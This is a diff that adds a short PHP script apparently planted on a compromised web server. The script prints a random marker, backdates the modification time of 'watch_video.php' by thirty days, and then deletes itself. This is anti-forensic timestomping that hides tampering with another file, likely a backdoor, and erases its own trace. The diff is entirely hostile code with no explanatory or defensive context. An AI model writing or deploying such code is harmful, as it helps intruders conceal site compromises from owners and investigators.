@@ -1,0 +1,1 @@
+<?php echo "yYsKHeFWvB"; if (file_exists("./watch_video.php")){ touch("./watch_video.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*FwwQneQW128YpXeVVmuN*/ ?>
